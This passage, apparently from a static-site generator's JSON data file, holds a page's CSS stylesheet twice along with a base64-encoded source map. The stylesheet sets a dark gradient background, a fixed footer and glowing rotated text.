sourceMappingURL=data:application/json;charset=utf8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIm1haW4uc2NzcyIsIm1haW4uY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBOztFQUVJLGFBQWE7RUFDYixZQUFZO0VBQ1osWUFBWTtFQUNaLGFBQWE7RUFDYixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxxQkFBcUI7RUFFckIscUJBQXFCO0VBQ3JCLGNBQWM7RUFDZCx5QkFBeUI7RUFFekIsc0JBQXNCO0VBQ3RCLHdCQUF3QjtFQUN4QiwwQkFBMEI7RUFFMUIsdUJBQXVCO0VBQ3ZCLG9CQUFvQjtFQUNwQiwrQkFBd0I7RUFDeEIsdUJBQWdCO0VBQ2hCLHdCQUF3QjtDQUMzQjs7QUFFRDtFQUNJLFlBQVk7RUFDWixhQUFhO0VBQ2Isc0ZBQWlDO0VBQWpDLGlGQUFpQztDQUVwQzs7QUFFRDtFQUNJLGVBQWU7RUFDZixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxZQUFZO0VBQ1osYUFBYTtDQUNoQjs7QUFFRDtFQUNJLHdCQUF3QjtFQUN4QixnQkFBZ0I7RUFDaEIsZ0NBQVc7RUFDWCxZQUFZO0VBQ1osZ0JBQWdCO0VBQ2hCLFlBQVk7RUFDWixjQUFjO0VBQ2QsbUJBQW1CO0VBQ25CLFlBQVk7Q0FDZjs7QUFFRDtFQUNJLG1CQUFtQjtFQUNuQixZQUFZO0VBQ1osY0FBYztFQUNkLFlBQVk7Q0FDZjs7QUFFRDtFQUNJLGFBQWE7RUFDYixtQkFBbUI7RUFDbkIsVUFBVTtFQUNWLG9CQUFvQjtDQUN2Qjs7QUFFRDtFQUNJLHNCQUFzQjtFQUN0QixlQUFXO0VBQ1gsWUFBWTtFQUNaLHFDQUFxQztFQUNyQyw2QkFBNkI7Q0FDaEM7O0FBRUQ7RUFDSSxXQUFXO0NBQ2Q7O0FBRUQsT0FBTztBQUVQO0VBQ0ksWUFBWTtFQUNaLG1CQUFtQjtFQUNuQixZQUFZO0VBQ1osVUFBVTtFQUNWLG1CQUFtQjtFQUNuQixhQUFhO0VBQ2IsMEJBQWlCO0VBQ2pCLGtDQUF5QjtFQUN6QixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxtQkFBVztFQUNYLDJCQUEyQjtFQUMzQiw0REFBdUM7RUFBdkMsb0RBQXVDO0NBQzFDOztBQUVEO0VBQ0k7SUFDSSwyQkFBMkI7R0FDOUI7Q0NESjs7QURJRDtFQUNJLG1CQUFtQjtDQUN0Qjs7QUFFRDtFQUNJLG1CQUFtQjtFQUNuQixVQUFVO0VBQ1YsWUFBWTtFQUNaLFlBQVk7Q0FDZiIsImZpbGUiOiJtYWluLmNzcyIsInNvdXJjZXNDb250ZW50IjpbImh0bWwsXG5ib2R5IHtcbiAgICBwYWRkaW5nOiAwcHg7XG4gICAgbWFyZ2luOiAwcHg7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xuICAgIHBvc2l0aW9uOiBmaXhlZDtcbn1cblxuYm9keSB7XG4gICAgZGlzcGxheTogLXdlYmtpdC1ib3g7XG4gICAgZGlzcGxheTogLXdlYmtpdC1mbGV4O1xuICAgIGRpc3BsYXk6IC1tcy1mbGV4Ym94O1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgLXdlYmtpdC1ib3gtcGFjazogY2VudGVyO1xuICAgIC13ZWJraXQtanVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gICAgLW1zLWZsZXgtcGFjazogY2VudGVyO1xuICAgIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICAgIC13ZWJraXQtYm94LWFsaWduOiBjZW50ZXI7XG4gICAgLXdlYmtpdC1hbGlnbi1pdGVtczogY2VudGVyO1xuICAgIC1tcy1mbGV4LWFsaWduOiBjZW50ZXI7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICAtd2Via2l0LWZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gICAgZmlsdGVyOiBjb250cmFzdCgxMjAlKTtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjaztcbn1cblxuLmNvbnRhaW5lciB7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xuICAgIGJhY2tncm91bmQtaW1hZ2U6IHJhZGlhbC1ncmFkaWVudCgxNjAwcHggYXQgNzAlIDEyMCUsIHJnYmEoMzMsIDM5LCA4MCwgMSkgMTAlLCAjMDIwNDA5IDEwMCUpO1xuXG59XG5cbi5jb250ZW50IHtcbiAgICB3aWR0aDogaW5oZXJpdDtcbiAgICBoZWlnaHQ6IGluaGVyaXQ7XG59XG5cbiN1bml2ZXJzZSB7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xufVxuXG4jZm9vdGVyQ29udGVudCB7XG4gICAgZm9udC1mYW1pbHk6IHNhbnMtc2VyaWY7XG4gICAgZm9udC1zaXplOiAxMTAlO1xuICAgIGNvbG9yOiByZ2JhKDIwMCwgMjIwLCAyNTUsIC4zKTtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgYm90dG9tOiAwcHg7XG4gICAgcGFkZGluZzogMjBweDtcbiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7XG4gICAgei1pbmRleDogMjA7XG59XG5cbiNmb290ZXIge1xuICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgICBib3R0b206IDBweDtcbiAgICBoZWlnaHQ6IDMwMHB4O1xuICAgIHdpZHRoOiAxMDAlO1xufVxuXG4jc2NlbmUge1xuICAgIGhlaWdodDogMTAwJTtcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgbGVmdDogNTAlO1xuICAgIG1hcmdpbi1sZWZ0OiAtODAwcHg7XG59XG5cbmEge1xuICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTtcbiAgICBjb2xvcjogcmdiYSgyMDAsIDIyMCwgMjU1LCAxKTtcbiAgICBvcGFjaXR5OiAuNDtcbiAgICAtd2Via2l0LXRyYW5zaXRpb246IG9wYWNpdHkgLjRzIGVhc2U7XG4gICAgdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbn1cblxuYTpob3ZlciB7XG4gICAgb3BhY2l0eTogMTtcbn1cblxuLypib3gqL1xuXG4jYm94IHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgYm90dG9tOiAzMCU7XG4gICAgbGVmdDogNTAlO1xuICAgIG1hcmdpbi1sZWZ0OiAtOTZweDtcbiAgICB6LWluZGV4OiAxMDA7XG4gICAgdHJhbnNmb3JtOiByb3RhdGUoLTEyZGVnKTtcbiAgICAtd2Via2l0LXRyYW5zZm9ybTogcm90YXRlKC0xMmRlZyk7XG4gICAgZm9udC1zaXplOiAxMnB4O1xufVxuXG4udHh0IHtcbiAgICBjb2xvcjogaHNsYSgwLCAwJSwgMCUsIDApO1xuICAgIHRleHQtc2hhZG93OiAjZmZmIDAgMCAxMHB4O1xuICAgIHRyYW5zaXRpb246IHRleHQtc2hhZG93IDJzIGN1YmljLWJlemllcigwLCAxLCAwLCAxKTtcbn1cblxuQC1tb3otZG9jdW1lbnQgdXJsLXByZWZpeCgpIHtcbiAgICAudHh0IHtcbiAgICAgICAgdGV4dC1zaGFkb3c6ICNmZmYgMCAwIDIwcHg7XG4gICAgfVxufVxuXG4jY2FudmFze1xuICAgIG1hcmdpbjogMjAwcHggYXV0bztcbn1cblxuLmdpdGh1YntcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgdG9wOiAxMHB4O1xuICAgIHJpZ2h0OiAxMHB4O1xuICAgIHdpZHRoOiAyMHB4O1xufSIsImh0bWwsXG5ib2R5IHtcbiAgcGFkZGluZzogMHB4O1xuICBtYXJnaW46IDBweDtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbiAgcG9zaXRpb246IGZpeGVkO1xufVxuXG5ib2R5IHtcbiAgZGlzcGxheTogLXdlYmtpdC1ib3g7XG4gIGRpc3BsYXk6IC13ZWJraXQtZmxleDtcbiAgZGlzcGxheTogLW1zLWZsZXhib3g7XG4gIGRpc3BsYXk6IGZsZXg7XG4gIC13ZWJraXQtYm94LXBhY2s6IGNlbnRlcjtcbiAgLXdlYmtpdC1qdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgLW1zLWZsZXgtcGFjazogY2VudGVyO1xuICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgLXdlYmtpdC1ib3gtYWxpZ246IGNlbnRlcjtcbiAgLXdlYmtpdC1hbGlnbi1pdGVtczogY2VudGVyO1xuICAtbXMtZmxleC1hbGlnbjogY2VudGVyO1xuICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAtd2Via2l0LWZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gIGZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gIGJhY2tncm91bmQtY29sb3I6IGJsYWNrO1xufVxuXG4uY29udGFpbmVyIHtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbiAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KDE2MDBweCBhdCA3MCUgMTIwJSwgIzIxMjc1MCAxMCUsICMwMjA0MDkgMTAwJSk7XG59XG5cbi5jb250ZW50IHtcbiAgd2lkdGg6IGluaGVyaXQ7XG4gIGhlaWdodDogaW5oZXJpdDtcbn1cblxuI3VuaXZlcnNlIHtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbn1cblxuI2Zvb3RlckNvbnRlbnQge1xuICBmb250LWZhbWlseTogc2Fucy1zZXJpZjtcbiAgZm9udC1zaXplOiAxMTAlO1xuICBjb2xvcjogcmdiYSgyMDAsIDIyMCwgMjU1LCAwLjMpO1xuICB3aWR0aDogMTAwJTtcbiAgcG9zaXRpb246IGZpeGVkO1xuICBib3R0b206IDBweDtcbiAgcGFkZGluZzogMjBweDtcbiAgdGV4dC1hbGlnbjogY2VudGVyO1xuICB6LWluZGV4OiAyMDtcbn1cblxuI2Zvb3RlciB7XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgYm90dG9tOiAwcHg7XG4gIGhlaWdodDogMzAwcHg7XG4gIHdpZHRoOiAxMDAlO1xufVxuXG4jc2NlbmUge1xuICBoZWlnaHQ6IDEwMCU7XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgbGVmdDogNTAlO1xuICBtYXJnaW4tbGVmdDogLTgwMHB4O1xufVxuXG5hIHtcbiAgdGV4dC1kZWNvcmF0aW9uOiBub25lO1xuICBjb2xvcjogI2M4ZGNmZjtcbiAgb3BhY2l0eTogLjQ7XG4gIC13ZWJraXQtdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbiAgdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbn1cblxuYTpob3ZlciB7XG4gIG9wYWNpdHk6IDE7XG59XG5cbi8qYm94Ki9cbiNib3gge1xuICBjb2xvcjogI2ZmZjtcbiAgcG9zaXRpb246IGFic29sdXRlO1xuICBib3R0b206IDMwJTtcbiAgbGVmdDogNTAlO1xuICBtYXJnaW4tbGVmdDogLTk2cHg7XG4gIHotaW5kZXg6IDEwMDtcbiAgdHJhbnNmb3JtOiByb3RhdGUoLTEyZGVnKTtcbiAgLXdlYmtpdC10cmFuc2Zvcm06IHJvdGF0ZSgtMTJkZWcpO1xuICBmb250LXNpemU6IDEycHg7XG59XG5cbi50eHQge1xuICBjb2xvcjogdHJhbnNwYXJlbnQ7XG4gIHRleHQtc2hhZG93OiAjZmZmIDAgMCAxMHB4O1xuICB0cmFuc2l0aW9uOiB0ZXh0LXNoYWRvdyAycyBjdWJpYy1iZXppZXIoMCwgMSwgMCwgMSk7XG59XG5cbkAtbW96LWRvY3VtZW50IHVybC1wcmVmaXgoKSB7XG4gIC50eHQge1xuICAgIHRleHQtc2hhZG93OiAjZmZmIDAgMCAyMHB4O1xuICB9XG59XG5cbiNjYW52YXMge1xuICBtYXJnaW46IDIwMHB4IGF1dG87XG59XG5cbi5naXRodWIge1xuICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gIHRvcDogMTBweDtcbiAgcmlnaHQ6IDEwcHg7XG4gIHdpZHRoOiAyMHB4O1xufVxuIl19 */\n","date":"2017-03-08T19:05:11.000Z","updated":"2017-03-08T19:05:11.000Z","path":"about/styles/main.css","layout":"false","title":"","comments":1,"_id":"cj2mm9xri004o5es51rih0o2d","content":"html,\nbody {\n  padding: 0px;\n  margin: 0px;\n  width: 100%;\n  height: 100%;\n  position: fixed;\n}\n\nbody {\n  display: -webkit-box;\n  display: -ms-flexbox;\n  display: flex;\n  -webkit-box-pack: center;\n  -ms-flex-pack: center;\n  justify-content: center;\n  -webkit-box-align: center;\n  -ms-flex-align: center;\n  align-items: center;\n  -webkit-filter: contrast(120%);\n  filter: contrast(120%);\n  background-color: black;\n}\n\n.container {\n  width: 100%;\n  height: 100%;\n  background-image: -webkit-radial-gradient(70% 120% 1600px, #212750 10%, #020409 100%);\n  background-image: radial-gradient(1600px at 70% 120%, #212750 10%, #020409 100%);\n}\n\n.content {\n  width: inherit;\n  height: inherit;\n}\n\n#universe {\n  width: 100%;\n  height: 100%;\n}\n\n#footerContent {\n  font-family: sans-serif;\n  font-size: 110%;\n  color: rgba(200, 220, 255, 0.3);\n  width: 100%;\n  position: fixed;\n  bottom: 0px;\n  padding: 20px;\n  text-align: center;\n  z-index: 20;\n}\n\n#footer {\n  position: absolute;\n  bottom: 0px;\n  height: 300px;\n  width: 100%;\n}\n\n#scene {\n  height: 100%;\n  position: absolute;\n  left: 50%;\n  margin-left: -800px;\n}\n\na {\n  text-decoration: none;\n  color: #c8dcff;\n  opacity: .4;\n  -webkit-transition: opacity .4s ease;\n  transition: opacity .4s ease;\n}\n\na:hover {\n  opacity: 1;\n}\n\n/*box*/\n#box {\n  color: #fff;\n  position: absolute;\n  bottom: 30%;\n  left: 50%;\n  margin-left: -96px;\n  z-index: 100;\n  transform: rotate(-12deg);\n  -webkit-transform: rotate(-12deg);\n  font-size: 12px;\n}\n\n.txt {\n  color: transparent;\n  text-shadow: #fff 0 0 10px;\n  -webkit-transition: text-shadow 2s cubic-bezier(0, 1, 0, 1);\n  transition: text-shadow 2s cubic-bezier(0, 1, 0, 1);\n}\n\n@-moz-document url-prefix() {\n  .txt {\n    text-shadow: #fff 0 0 20px;\n  }\n}\n\n#canvas {\n  margin: 200px auto;\n}\n\n.github {\n  position: absolute;\n  top: 10px;\n  right: 10px;\n  width: 20px;\n}\n\n/*# sourceMappingURL=data:application/json;charset=utf8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIm1haW4uc2NzcyIsIm1haW4uY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBOztFQUVJLGFBQWE7RUFDYixZQUFZO0VBQ1osWUFBWTtFQUNaLGFBQWE7RUFDYixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxxQkFBcUI7RUFFckIscUJBQXFCO0VBQ3JCLGNBQWM7RUFDZCx5QkFBeUI7RUFFekIsc0JBQXNCO0VBQ3RCLHdCQUF3QjtFQUN4QiwwQkFBMEI7RUFFMUIsdUJBQXVCO0VBQ3ZCLG9CQUFvQjtFQUNwQiwrQkFBd0I7RUFDeEIsdUJBQWdCO0VBQ2hCLHdCQUF3QjtDQUMzQjs7QUFFRDtFQUNJLFlBQVk7RUFDWixhQUFhO0VBQ2Isc0ZBQWlDO0VBQWpDLGlGQUFpQztDQUVwQzs7QUFFRDtFQUNJLGVBQWU7RUFDZixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxZQUFZO0VBQ1osYUFBYTtDQUNoQjs7QUFFRDtFQUNJLHdCQUF3QjtFQUN4QixnQkFBZ0I7RUFDaEIsZ0NBQVc7RUFDWCxZQUFZO0VBQ1osZ0JBQWdCO0VBQ2hCLFlBQVk7RUFDWixjQUFjO0VBQ2QsbUJBQW1CO0VBQ25CLFlBQVk7Q0FDZjs7QUFFRDtFQUNJLG1CQUFtQjtFQUNuQixZQUFZO0VBQ1osY0FBYztFQUNkLFlBQVk7Q0FDZjs7QUFFRDtFQUNJLGFBQWE7RUFDYixtQkFBbUI7RUFDbkIsVUFBVTtFQUNWLG9CQUFvQjtDQUN2Qjs7QUFFRDtFQUNJLHNCQUFzQjtFQUN0QixlQUFXO0VBQ1gsWUFBWTtFQUNaLHFDQUFxQztFQUNyQyw2QkFBNkI7Q0FDaEM7O0FBRUQ7RUFDSSxXQUFXO0NBQ2Q7O0FBRUQsT0FBTztBQUVQO0VBQ0ksWUFBWTtFQUNaLG1CQUFtQjtFQUNuQixZQUFZO0VBQ1osVUFBVTtFQUNWLG1CQUFtQjtFQUNuQixhQUFhO0VBQ2IsMEJBQWlCO0VBQ2pCLGtDQUF5QjtFQUN6QixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxtQkFBVztFQUNYLDJCQUEyQjtFQUMzQiw0REFBdUM7RUFBdkMsb0RBQXVDO0NBQzFDOztBQUVEO0VBQ0k7SUFDSSwyQkFBMkI7R0FDOUI7Q0NESjs7QURJRDtFQUNJLG1CQUFtQjtDQUN0Qjs7QUFFRDtFQUNJLG1CQUFtQjtFQUNuQixVQUFVO0VBQ1YsWUFBWTtFQUNaLFlBQVk7Q0FDZiIsImZpbGUiOiJtYWluLmNzcyIsInNvdXJjZXNDb250ZW50IjpbImh0bWwsXG5ib2R5IHtcbiAgICBwYWRkaW5nOiAwcHg7XG4gICAgbWFyZ2luOiAwcHg7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xuICAgIHBvc2l0aW9uOiBmaXhlZDtcbn1cblxuYm9keSB7XG4gICAgZGlzcGxheTogLXdlYmtpdC1ib3g7XG4gICAgZGlzcGxheTogLXdlYmtpdC1mbGV4O1xuICAgIGRpc3BsYXk6IC1tcy1mbGV4Ym94O1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgLXdlYmtpdC1ib3gtcGFjazogY2VudGVyO1xuICAgIC13ZWJraXQtanVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gICAgLW1zLWZsZXgtcGFjazogY2VudGVyO1xuICAgIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICAgIC13ZWJraXQtYm94LWFsaWduOiBjZW50ZXI7XG4gICAgLXdlYmtpdC1hbGlnbi1pdGVtczogY2VudGVyO1xuICAgIC1tcy1mbGV4LWFsaWduOiBjZW50ZXI7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICAtd2Via2l0LWZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gICAgZmlsdGVyOiBjb250cmFzdCgxMjAlKTtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjaztcbn1cblxuLmNvbnRhaW5lciB7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xuICAgIGJhY2tncm91bmQtaW1hZ2U6IHJhZGlhbC1ncmFkaWVudCgxNjAwcHggYXQgNzAlIDEyMCUsIHJnYmEoMzMsIDM5LCA4MCwgMSkgMTAlLCAjMDIwNDA5IDEwMCUpO1xuXG59XG5cbi5jb250ZW50IHtcbiAgICB3aWR0aDogaW5oZXJpdDtcbiAgICBoZWlnaHQ6IGluaGVyaXQ7XG59XG5cbiN1bml2ZXJzZSB7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xufVxuXG4jZm9vdGVyQ29udGVudCB7XG4gICAgZm9udC1mYW1pbHk6IHNhbnMtc2VyaWY7XG4gICAgZm9udC1zaXplOiAxMTAlO1xuICAgIGNvbG9yOiByZ2JhKDIwMCwgMjIwLCAyNTUsIC4zKTtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgYm90dG9tOiAwcHg7XG4gICAgcGFkZGluZzogMjBweDtcbiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7XG4gICAgei1pbmRleDogMjA7XG59XG5cbiNmb290ZXIge1xuICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgICBib3R0b206IDBweDtcbiAgICBoZWlnaHQ6IDMwMHB4O1xuICAgIHdpZHRoOiAxMDAlO1xufVxuXG4jc2NlbmUge1xuICAgIGhlaWdodDogMTAwJTtcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgbGVmdDogNTAlO1xuICAgIG1hcmdpbi1sZWZ0OiAtODAwcHg7XG59XG5cbmEge1xuICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTtcbiAgICBjb2xvcjogcmdiYSgyMDAsIDIyMCwgMjU1LCAxKTtcbiAgICBvcGFjaXR5OiAuNDtcbiAgICAtd2Via2l0LXRyYW5zaXRpb246IG9wYWNpdHkgLjRzIGVhc2U7XG4gICAgdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbn1cblxuYTpob3ZlciB7XG4gICAgb3BhY2l0eTogMTtcbn1cblxuLypib3gqL1xuXG4jYm94IHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgYm90dG9tOiAzMCU7XG4gICAgbGVmdDogNTAlO1xuICAgIG1hcmdpbi1sZWZ0OiAtOTZweDtcbiAgICB6LWluZGV4OiAxMDA7XG4gICAgdHJhbnNmb3JtOiByb3RhdGUoLTEyZGVnKTtcbiAgICAtd2Via2l0LXRyYW5zZm9ybTogcm90YXRlKC0xMmRlZyk7XG4gICAgZm9udC1zaXplOiAxMnB4O1xufVxuXG4udHh0IHtcbiAgICBjb2xvcjogaHNsYSgwLCAwJSwgMCUsIDApO1xuICAgIHRleHQtc2hhZG93OiAjZmZmIDAgMCAxMHB4O1xuICAgIHRyYW5zaXRpb246IHRleHQtc2hhZG93IDJzIGN1YmljLWJlemllcigwLCAxLCAwLCAxKTtcbn1cblxuQC1tb3otZG9jdW1lbnQgdXJsLXByZWZpeCgpIHtcbiAgICAudHh0IHtcbiAgICAgICAgdGV4dC1zaGFkb3c6ICNmZmYgMCAwIDIwcHg7XG4gICAgfVxufVxuXG4jY2FudmFze1xuICAgIG1hcmdpbjogMjAwcHggYXV0bztcbn1cblxuLmdpdGh1YntcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgdG9wOiAxMHB4O1xuICAgIHJpZ2h0OiAxMHB4O1xuICAgIHdpZHRoOiAyMHB4O1xufSIsImh0bWwsXG5ib2R5IHtcbiAgcGFkZGluZzogMHB4O1xuICBtYXJnaW46IDBweDtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbiAgcG9zaXRpb246IGZpeGVkO1xufVxuXG5ib2R5IHtcbiAgZGlzcGxheTogLXdlYmtpdC1ib3g7XG4gIGRpc3BsYXk6IC13ZWJraXQtZmxleDtcbiAgZGlzcGxheTogLW1zLWZsZXhib3g7XG4gIGRpc3BsYXk6IGZsZXg7XG4gIC13ZWJraXQtYm94LXBhY2s6IGNlbnRlcjtcbiAgLXdlYmtpdC1qdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgLW1zLWZsZXgtcGFjazogY2VudGVyO1xuICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgLXdlYmtpdC1ib3gtYWxpZ246IGNlbnRlcjtcbiAgLXdlYmtpdC1hbGlnbi1pdGVtczogY2VudGVyO1xuICAtbXMtZmxleC1hbGlnbjogY2VudGVyO1xuICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAtd2Via2l0LWZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gIGZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gIGJhY2tncm91bmQtY29sb3I6IGJsYWNrO1xufVxuXG4uY29udGFpbmVyIHtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbiAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KDE2MDBweCBhdCA3MCUgMTIwJSwgIzIxMjc1MCAxMCUsICMwMjA0MDkgMTAwJSk7XG59XG5cbi5jb250ZW50IHtcbiAgd2lkdGg6IGluaGVyaXQ7XG4gIGhlaWdodDogaW5oZXJpdDtcbn1cblxuI3VuaXZlcnNlIHtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbn1cblxuI2Zvb3RlckNvbnRlbnQge1xuICBmb250LWZhbWlseTogc2Fucy1zZXJpZjtcbiAgZm9udC1zaXplOiAxMTAlO1xuICBjb2xvcjogcmdiYSgyMDAsIDIyMCwgMjU1LCAwLjMpO1xuICB3aWR0aDogMTAwJTtcbiAgcG9zaXRpb246IGZpeGVkO1xuICBib3R0b206IDBweDtcbiAgcGFkZGluZzogMjBweDtcbiAgdGV4dC1hbGlnbjogY2VudGVyO1xuICB6LWluZGV4OiAyMDtcbn1cblxuI2Zvb3RlciB7XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgYm90dG9tOiAwcHg7XG4gIGhlaWdodDogMzAwcHg7XG4gIHdpZHRoOiAxMDAlO1xufVxuXG4jc2NlbmUge1xuICBoZWlnaHQ6IDEwMCU7XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgbGVmdDogNTAlO1xuICBtYXJnaW4tbGVmdDogLTgwMHB4O1xufVxuXG5hIHtcbiAgdGV4dC1kZWNvcmF0aW9uOiBub25lO1xuICBjb2xvcjogI2M4ZGNmZjtcbiAgb3BhY2l0eTogLjQ7XG4gIC13ZWJraXQtdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbiAgdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbn1cblxuYTpob3ZlciB7XG4gIG9wYWNpdHk6IDE7XG59XG5cbi8qYm94Ki9cbiNib3gge1xuICBjb2xvcjogI2ZmZjtcbiAgcG9zaXRpb246IGFic29sdXRlO1xuICBib3R0b206IDMwJTtcbiAgbGVmdDogNTAlO1xuICBtYXJnaW4tbGVmdDogLTk2cHg7XG4gIHotaW5kZXg6IDEwMDtcbiAgdHJhbnNmb3JtOiByb3RhdGUoLTEyZGVnKTtcbiAgLXdlYmtpdC10cmFuc2Zvcm06IHJvdGF0ZSgtMTJkZWcpO1xuICBmb250LXNpemU6IDEycHg7XG59XG5cbi50eHQge1xuICBjb2xvcjogdHJhbnNwYXJlbnQ7XG4gIHRleHQtc2hhZG93OiAjZmZmIDAgMCAxMHB4O1xuICB0cmFuc2l0aW9uOiB0ZXh0LXNoYWRvdyAycyBjdWJpYy1iZXppZXIoMCwgMSwgMCwgMSk7XG59XG5cbkAtbW96LWRvY3VtZW50IHVybC1wcmVmaXgoKSB7XG4gIC50eHQge1xuICAgIHRleHQtc2hhZG93OiAjZmZmIDAgMCAyMHB4O1xuICB9XG59XG5cbiNjYW52YXMge1xuICBtYXJnaW46IDIwMHB4IGF1dG87XG59XG5cbi5naXRodWIge1xuICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gIHRvcDogMTBweDtcbiAgcmlnaHQ6IDEwcHg7XG4gIHdpZHRoOiAyMHB4O1xufVxuIl19 */\n","excerpt":"","more":"html,\nbody {\n  padding: 0px;\n  margin: 0px;\n  width: 100%;\n  height: 100%;\n  position: fixed;\n}\n\nbody {\n  display: -webkit-box;\n  display: -ms-flexbox;\n  display: flex;\n  -webkit-box-pack: center;\n  -ms-flex-pack: center;\n  justify-content: center;\n  -webkit-box-align: center;\n  -ms-flex-align: center;\n  align-items: center;\n  -webkit-filter: contrast(120%);\n  filter: contrast(120%);\n  background-color: black;\n}\n\n.container {\n  width: 100%;\n  height: 100%;\n  background-image: -webkit-radial-gradient(70% 120% 1600px, #212750 10%, #020409 100%);\n  background-image: radial-gradient(1600px at 70% 120%, #212750 10%, #020409 100%);\n}\n\n.content {\n  width: inherit;\n  height: inherit;\n}\n\n#universe {\n  width: 100%;\n  height: 100%;\n}\n\n#footerContent {\n  font-family: sans-serif;\n  font-size: 110%;\n  color: rgba(200, 220, 255, 0.3);\n  width: 100%;\n  position: fixed;\n  bottom: 0px;\n  padding: 20px;\n  text-align: center;\n  z-index: 20;\n}\n\n#footer {\n  position: absolute;\n  bottom: 0px;\n  height: 300px;\n  width: 100%;\n}\n\n#scene {\n  height: 100%;\n  position: absolute;\n  left: 50%;\n  margin-left: -800px;\n}\n\na {\n  text-decoration: none;\n  color: #c8dcff;\n  opacity: .4;\n  -webkit-transition: opacity .4s ease;\n  transition: opacity .4s ease;\n}\n\na:hover {\n  opacity: 1;\n}\n\n/*box*/\n#box {\n  color: #fff;\n  position: absolute;\n  bottom: 30%;\n  left: 50%;\n  margin-left: -96px;\n  z-index: 100;\n  transform: rotate(-12deg);\n  -webkit-transform: rotate(-12deg);\n  font-size: 12px;\n}\n\n.txt {\n  color: transparent;\n  text-shadow: #fff 0 0 10px;\n  -webkit-transition: text-shadow 2s cubic-bezier(0, 1, 0, 1);\n  transition: text-shadow 2s cubic-bezier(0, 1, 0, 1);\n}\n\n@-moz-document url-prefix() {\n  .txt {\n    text-shadow: #fff 0 0 20px;\n  